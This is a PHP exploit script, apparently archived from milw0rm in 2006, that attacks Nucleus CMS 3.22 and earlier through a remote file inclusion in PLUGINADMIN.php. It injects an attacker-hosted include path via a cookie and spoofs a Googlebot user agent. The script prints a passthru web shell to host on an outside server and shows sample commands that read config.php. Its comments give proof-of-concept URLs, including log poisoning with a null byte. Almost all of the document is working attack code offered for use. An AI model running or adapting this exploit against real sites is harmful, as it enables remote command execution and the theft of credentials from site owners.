#!/usr/bin/php -q -d short_open_tag=on
<?
echo "Nucleus <= 3.22 arbitrary remote inclusion exploit\r\n";
echo "by rgod rgod@autistici.org\r\n";
echo "site: http://retrogod.altervista.org\r\n\r\n";
echo "this is called the \"deadly eyes of Sun-tzu\"\r\n";
echo "dork: Copyright . Nucleus CMS v3.22 . Valid XHTML 1.0 Strict . Valid CSS . Back to top\r\n\r\n";
/*
works with:
register_globals=Om
allow_url_fopen=Om
*/

if ($argc<5) {
echo "Usage: php ".$argv[0]." host path location cmd OPTIONS\r\n";
echo "host:      target server (ip/hostname)\r\n";
echo "path:      path to Nucleus\r\n";
echo "location:  an arbitrary location with the code to include\r\n";
echo "cmd:       a shell command\r\n";
echo "Options:\r\n";
echo "   -p[port]:    specify a port other than 80\r\n";
echo "   -P[ip:port]: specify a proxy\r\n";
echo "Examples:\r\n";
echo "php ".$argv[0]." localhost /nucleus/ http://somehost.com/ cat ./../../config.php\r\n";
echo "php ".$argv[0]." localhost /nucleus/ http://somehost.com/ ls -la -p81\r\n";
echo "php ".$argv[0]." localhost / http://somehost.com/ ls -la -P1.1.1.1:80\r\n\r\n";
echo "note, you need this code in http://somehost.com/ADMIN.php/index.html\r\n";
echo "<?php\r\n";
echo "if (get_magic_quotes_gpc()){\$_REQUEST[\"cmd\"]=stripslashes(\$_REQUEST[\"cmd\"]);}\r\n";
echo "ini_set(\"max_execution_time\",0);\r\n";
echo "echo \"*delim*\";\r\n";
echo "passthru(\$_REQUEST[\"cmd\"]);\r\n";
echo "echo \"*delim*\";\r\n";
echo "?>\r\n";
die;
}

/* software site: http://nucleuscms.org/

   i) vulnerable code in nucleus/libs/PLUGINADMIN.php at lines 21-49:

   ...
   global $HTTP_GET_VARS, $HTTP_POST_VARS, $HTTP_COOKIE_VARS, $HTTP_ENV_VARS, $HTTP_POST_FILES, $HTTP_SESSION_VARS;
$aVarsToCheck = array('DIR_LIBS');
foreach ($aVarsToCheck as $varName)
{
	if (phpversion() >= '4.1.0')
	{
		if (   isset($_GET[$varName])
			|| isset($_POST[$varName])
			|| isset($_COOKIE[$varName])
			|| isset($_ENV[$varName])
			|| isset($_SESSION[$varName])
			|| isset($_FILES[$varName])
		){
			die('Sorry. An error occurred.');
		}
	} else {
		if (   isset($HTTP_GET_VARS[$varName])
			|| isset($HTTP_POST_VARS[$varName])
			|| isset($HTTP_COOKIE_VARS[$varName])
			|| isset($HTTP_ENV_VARS[$varName])
			|| isset($HTTP_SESSION_VARS[$varName])
			|| isset($HTTP_POST_FILES[$varName])
		){
			die('Sorry. An error occurred.');
		}
	}
}

include($DIR_LIBS . 'ADMIN.php');
...

so, if register_globals = On and allow_url_fopen = On, we have arbitrary remote inclusion, poc:

http://[target]/[path_to_nucleus]/nucleus/libs/PLUGINADMIN.php?GLOBALS[DIR_LIBS]=http://somehost.com/&cmd=ls%20-la

where on somehost.com we have some php code in

http://somehost.com/ADMIN.php/index.html

also, if register_globals = On & magic_quotes_gpc = Off:

http://[target]/[path_to_nucleus]/nucleus/libs/PLUGINADMIN.php?GLOBALS[DIR_LIBS]=/var/log/httpd/access_log%00&cmd=ls%20-la

									      */
error_reporting(0);
ini_set("max_execution_time",0);
ini_set("default_socket_timeout",5);

function quick_dump($string)
{
  $result='';$exa='';$cont=0;
  for ($i=0; $i<=strlen($string)-1; $i++)
  {
   if ((ord($string[$i]) <= 32 ) | (ord($string[$i]) > 126 ))
   {$result.="  .";}
   else
   {$result.="  ".$string[$i];}
   if (strlen(dechex(ord($string[$i])))==2)
   {$exa.=" ".dechex(ord($string[$i]));}
   else
   {$exa.=" 0".dechex(ord($string[$i]));}
   $cont++;if ($cont==15) {$cont=0; $result.="\r\n"; $exa.="\r\n";}
  }
 return $exa."\r\n".$result;
}
$proxy_regex = '(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)';
function sendpacketii($packet)
{
  global $proxy, $host, $port, $html, $proxy_regex;
  if ($proxy=='') {
    $ock=fsockopen(gethostbyname($host),$port);
    if (!$ock) {
      echo 'No response from '.$host.':'.$port; die;
    }
  }
  else {
	$c = preg_match($proxy_regex,$proxy);
    if (!$c) {
      echo 'Not a valid proxy...';die;
    }
    $parts=explode(':',$proxy);
    echo "Connecting to ".$parts[0].":".$parts[1]." proxy...\r\n";
    $ock=fsockopen($parts[0],$parts[1]);
    if (!$ock) {
      echo 'No response from proxy...';die;
	}
  }
  fputs($ock,$packet);
  if ($proxy=='') {
    $html='';
    while (!feof($ock)) {
      $html.=fgets($ock);
    }
  }
  else {
    $html='';
    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {
      $html.=fread($ock,1);
    }
  }
  fclose($ock);
  #debug
  #echo "\r\n".$html;

}
$host=$argv[1];
$path=$argv[2];
$loc=urlencode($argv[3]);
if (($path[0]<>'/') | ($path[strlen($path)-1]<>'/'))
{die("Check the path, it must begin and end with a trailing slash\r\n");}
$port=80;
$proxy="";
$cmd="";
for ($i=4; $i<=$argc-1; $i++){
$temp=$argv[$i][0].$argv[$i][1];
if (($temp<>"-p") and ($temp<>"-P"))
{
$cmd.=" ".$argv[$i];
}
if ($temp=="-p")
{
  $port=str_replace("-p","",$argv[$i]);
}
if ($temp=="-P")
{
  $proxy=str_replace("-P","",$argv[$i]);
}
}
$cmd=urlencode($cmd);
if ($proxy<>'') {$p="http://".$host.":".$port.$path;} else {$p=$path;}

$packet ="GET ".$p."nucleus/libs/PLUGINADMIN.php HTTP/1.0\r\n";
$packet.="User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)\r\n";
$packet.="Host: ".$host."\r\n";
//through cookies, it's the same, maybe can bypass some ids...
$packet.="Cookie: GLOBALS[DIR_LIBS]=".$loc."; cmd=".$cmd.";\r\n";
$packet.="Connection: Close\r\n\r\n";
sendpacketii($packet);

if (strstr($html,"*delim*"))
{
  echo "Exploit succeeded...";
  $temp=explode("*delim*",$html);
  die("\r\n".$temp[1]."\r\n");
}
//if you are here...
echo "Exploit failed...\r\n";
?>

# milw0rm.com [2006-05-23]
